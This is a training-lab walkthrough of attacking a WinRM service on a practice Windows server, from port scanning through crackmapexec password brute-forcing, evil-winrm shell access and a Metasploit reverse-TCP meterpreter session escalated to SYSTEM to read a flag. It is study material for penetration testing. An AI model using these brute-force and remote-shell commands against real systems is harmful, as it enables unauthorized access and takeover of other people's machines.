### WinRM (Windows Remote Management)

- Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with windows remote systems over HTTP(S).
- Microsoft implemented WinRM in to Windows in order to make life easier for system administrators
- WinRM is typically used in the following ways:
	- Remotely access and interact with Windows hosts on a local network
	- Remotely access and execute commands on Windows systems.
	- Manage and configue windows systems remotely
- WinRM typically uses TCP port 5985 and 5986 (HTTPS).
- WinRM implements access control and security for communication between systems through various forms of authentication
- We can utilize a utility called "crackmapexec" to perform a bruteforce on WinRM in order to identify users and their passwords as well as execute commands on the target system.
- We can also utilize a ruby script called "evil-winrm" to obtain a command shell session on the target system.

---

A Kali GUI machine and a target machine running a WinRM server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the WinRM service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework exploit and auxiliary modules.

Objective: Exploit the WinRM service to get a meterpreter on the target and retrieve the flag!

Target : 10.5.31.145

[[ping]]

```
root@attackdefense:~# ping -c 5 10.5.31.145
PING 10.5.31.145 (10.5.31.145) 56(84) bytes of data.
64 bytes from 10.5.31.145: icmp_seq=1 ttl=125 time=2.15 ms
64 bytes from 10.5.31.145: icmp_seq=2 ttl=125 time=1.99 ms
64 bytes from 10.5.31.145: icmp_seq=3 ttl=125 time=1.90 ms
64 bytes from 10.5.31.145: icmp_seq=4 ttl=125 time=1.88 ms
64 bytes from 10.5.31.145: icmp_seq=5 ttl=125 time=1.89 ms

--- 10.5.31.145 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 1.879/1.963/2.152/0.102 ms
```

[[Hack2.0/NMAP#General Scan|NMAP basic scan]]

```
root@attackdefense:~# nmap -sV 10.5.31.145
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-17 22:09 IST
Nmap scan report for 10.5.31.145
Host is up (0.0019s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.91 seconds
```

When we use the above script it will only scan for the 1000 most used ports so let us go ahead and try checking for all ports or only the ports that we know that work for WinRM. I would like to scan for all ports so yeaa the choice is totally upto the attacker.

```
root@attackdefense:~# nmap -p- -sV -T4 10.5.31.145
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-17 22:12 IST
Nmap scan report for 10.5.31.145
Host is up (0.0018s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 386.48 seconds
```

[[crackmapexec#basic command|crackmapexec]]

```
root@attackdefense:~# crackmapexec winrm 10.5.31.145 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
WINRM       10.5.31.145     5985   NONE             [*] http://10.5.31.145:5985/wsman
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:admin "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:123456 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:12345 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:123456789 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:password "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:iloveyou "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:princess "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:1234567 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:12345678 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:abc123 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:nicole "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:daniel "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:babygirl "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:monkey "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:lovely "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:jessica "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:654321 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:michael "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:ashley "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:qwerty "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:111111 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:iloveu "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:000000 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:michelle "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:tigger "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:sunshine "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:chocolate "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:password1 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:soccer "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:anthony "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:friends "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:butterfly "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:purple "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:angel "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:jordan "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:liverpool "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:justin "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:loveme "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:fuckyou "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:123123 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:football "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:secret "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:andrea "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:carlos "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:jennifer "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:joshua "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:bubbles "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:1234567890 "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:superman "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:hannah "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:amanda "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:loveyou "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:pretty "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:basketball "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:andrew "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:angels "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:tweety "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:flower "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:playboy "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:hello "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:elizabeth "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [-] None\administrator:hottie "Failed to authenticate the user administrator with ntlm"
WINRM       10.5.31.145     5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
```

```
root@attackdefense:~# crackmapexec winrm 10.5.31.145 -u administrator -p tinkerbell -x whoami
WINRM       10.5.31.145     5985   NONE             [*] http://10.5.31.145:5985/wsman
WINRM       10.5.31.145     5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
WINRM       10.5.31.145     5985   NONE             [+] Executed command
WINRM       10.5.31.145     5985   NONE             server\administrator
```

```
root@attackdefense:~# crackmapexec winrm 10.5.31.145 -u administrator -p tinkerbell -x systeminfo
WINRM       10.5.31.145     5985   NONE             [*] http://10.5.31.145:5985/wsman
WINRM       10.5.31.145     5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
WINRM       10.5.31.145     5985   NONE             [+] Executed command
WINRM       10.5.31.145     5985   NONE             
Host Name:                 SERVER
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA975
Original Install Date:     10/1/2020, 2:03:19 PM
System Boot Time:          7/17/2023, 4:21:17 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,096 MB
Available Physical Memory: 3,199 MB
Virtual Memory: Max Size:  5,504 MB
Virtual Memory: Available: 4,739 MB
Virtual Memory: In Use:    765 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\SERVER
Hotfix(s):                 20 Hotfix(s) Installed.
                           [01]: KB4570720
                           [02]: KB4470502
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4493510
                           [06]: KB4494174
                           [07]: KB4499728
                           [08]: KB4504369
                           [09]: KB4512577
                           [10]: KB4512937
                           [11]: KB4521862
                           [12]: KB4523204
                           [13]: KB4539571
                           [14]: KB4549947
                           [15]: KB4558997
                           [16]: KB4561600
                           [17]: KB4562562
                           [18]: KB4566424
                           [19]: KB4570332
                           [20]: KB4570333
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.5.16.1
                                 IP address(es)
                                 [01]: 10.5.31.145
                                 [02]: fe80::d1b0:b3fc:40fa:d8b4
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

[[evil-winrm#basic command| Using evil winrm]]

```
root@attackdefense:~# evil-winrm.rb -u administrator -p tinkerbell -i 10.5.31.145

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd c/
Cannot find path 'C:\Users\Administrator\Documents\c\' because it does not exist.
At line:1 char:1
+ cd c/
+ ~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Documents\c\:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd /
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2018   6:56 AM                EFI
d-----        5/13/2020   5:58 PM                PerfLogs
d-r---       11/14/2018   4:10 PM                Program Files
d-----        10/1/2020   2:56 PM                Program Files (x86)
d-r---        10/1/2020   2:03 PM                Users
d-----        10/1/2020   2:02 PM                Windows
-a----        10/1/2020   2:52 PM             32 flag.txt


*Evil-WinRM* PS C:\> type flag.txt
3c716f95616eec677a7078f92657a230
*Evil-WinRM* PS C:\> 
```

[[metasploit]]

```
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
msf5 > search evil_winrm
[-] No results from search
msf5 > search winrm

Matching Modules
================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  auxiliary/scanner/winrm/winrm_auth_methods                   normal  No     WinRM Authentication Method Detection
   1  auxiliary/scanner/winrm/winrm_cmd                            normal  No     WinRM Command Runner
   2  auxiliary/scanner/winrm/winrm_login                          normal  No     WinRM Login Utility
   3  auxiliary/scanner/winrm/winrm_wql                            normal  No     WinRM WQL Query Runner
   4  exploit/windows/winrm/winrm_script_exec     2012-11-01       manual  No     WinRM Script Exec Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/winrm/winrm_script_exec

msf5 > use 4
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/winrm/winrm_script_exec) > options

Module options (exploit/windows/winrm/winrm_script_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification
   FORCE_VBS  false            yes       Force the module to use the VBS CmdStager
   PASSWORD                    yes       A specific password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      5985             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URI        /wsman           yes       The URI of the WinRM service
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       A specific username to authenticate as
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.26.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf5 exploit(windows/winrm/winrm_script_exec) > set rhosts 10.5.31.145
rhosts => 10.5.31.145
msf5 exploit(windows/winrm/winrm_script_exec) > set username administrator
username => administrator
msf5 exploit(windows/winrm/winrm_script_exec) > set password tinkerbell
password => tinkerbell
msf5 exploit(windows/winrm/winrm_script_exec) > run

[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] checking for Powershell 2.0
[-] Exploit failed: RuntimeError [BUG] Unexpected node test: <:child>: <[:qname, "w", "Items"]>
[*] Exploit completed, but no session was created.
msf5 exploit(windows/winrm/winrm_script_exec) > set force_vbs true 
force_vbs => true
msf5 exploit(windows/winrm/winrm_script_exec) > run

[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] User selected the FORCE_VBS option
[*] Command Stager progress -   2.01% done (2046/101936 bytes)
[*] Command Stager progress -   4.01% done (4092/101936 bytes)
[*] Command Stager progress -   6.02% done (6138/101936 bytes)
[*] Command Stager progress -   8.03% done (8184/101936 bytes)
[*] Command Stager progress -  10.04% done (10230/101936 bytes)
[*] Command Stager progress -  12.04% done (12276/101936 bytes)
[*] Command Stager progress -  14.05% done (14322/101936 bytes)
[*] Command Stager progress -  16.06% done (16368/101936 bytes)
[*] Command Stager progress -  18.06% done (18414/101936 bytes)
[*] Command Stager progress -  20.07% done (20460/101936 bytes)
[*] Command Stager progress -  22.08% done (22506/101936 bytes)
[*] Command Stager progress -  24.09% done (24552/101936 bytes)
[*] Command Stager progress -  26.09% done (26598/101936 bytes)
[*] Command Stager progress -  28.10% done (28644/101936 bytes)
[*] Command Stager progress -  30.11% done (30690/101936 bytes)
[*] Command Stager progress -  32.11% done (32736/101936 bytes)
[*] Command Stager progress -  34.12% done (34782/101936 bytes)
[*] Command Stager progress -  36.13% done (36828/101936 bytes)
[*] Command Stager progress -  38.14% done (38874/101936 bytes)
[*] Command Stager progress -  40.14% done (40920/101936 bytes)
[*] Command Stager progress -  42.15% done (42966/101936 bytes)
[*] Command Stager progress -  44.16% done (45012/101936 bytes)
[*] Command Stager progress -  46.16% done (47058/101936 bytes)
[*] Command Stager progress -  48.17% done (49104/101936 bytes)
[*] Command Stager progress -  50.18% done (51150/101936 bytes)
[*] Command Stager progress -  52.19% done (53196/101936 bytes)
[*] Command Stager progress -  54.19% done (55242/101936 bytes)
[*] Command Stager progress -  56.20% done (57288/101936 bytes)
[*] Command Stager progress -  58.21% done (59334/101936 bytes)
[*] Command Stager progress -  60.21% done (61380/101936 bytes)
[*] Command Stager progress -  62.22% done (63426/101936 bytes)
[*] Command Stager progress -  64.23% done (65472/101936 bytes)
[*] Command Stager progress -  66.24% done (67518/101936 bytes)
[*] Command Stager progress -  68.24% done (69564/101936 bytes)
[*] Command Stager progress -  70.25% done (71610/101936 bytes)
[*] Command Stager progress -  72.26% done (73656/101936 bytes)
[*] Command Stager progress -  74.26% done (75702/101936 bytes)
[*] Command Stager progress -  76.27% done (77748/101936 bytes)
[*] Command Stager progress -  78.28% done (79794/101936 bytes)
[*] Command Stager progress -  80.29% done (81840/101936 bytes)
[*] Command Stager progress -  82.29% done (83886/101936 bytes)
[*] Command Stager progress -  84.30% done (85932/101936 bytes)
[*] Command Stager progress -  86.31% done (87978/101936 bytes)
[*] Command Stager progress -  88.31% done (90024/101936 bytes)
[*] Command Stager progress -  90.32% done (92070/101936 bytes)
[*] Command Stager progress -  92.33% done (94116/101936 bytes)
[*] Command Stager progress -  94.34% done (96162/101936 bytes)
[*] Command Stager progress -  96.34% done (98208/101936 bytes)
[*] Command Stager progress -  98.35% done (100252/101936 bytes)
[*] Sending stage (176195 bytes) to 10.5.31.145
[*] Meterpreter session 1 opened (10.10.26.2:4444 -> 10.5.31.145:49858) at 2023-07-17 22:37:31 +0530
[*] Session ID 1 (10.10.26.2:4444 -> 10.5.31.145:49858) processing InitialAutoRunScript 'post/windows/manage/priv_migrate'
[*] Current session process is ddwni.exe (1552) as: SERVER\Administrator
[*] Session is Admin but not System.
[*] Will attempt to migrate to specified System level process.
[-] Could not migrate to services.exe.
[-] Could not migrate to wininit.exe.
[*] Trying svchost.exe (888)
[+] Successfully migrated to svchost.exe (888) as: NT AUTHORITY\SYSTEM
[*] nil
[*] Command Stager progress - 100.00% done (101936/101936 bytes)

meterpreter > shell
Process 3768 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>sysinfo
sysinfo
'sysinfo' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>cd /
cd /

C:\>type flag.txt
type flag.txt
3c716f95616eec677a7078f92657a230
C:\>

```

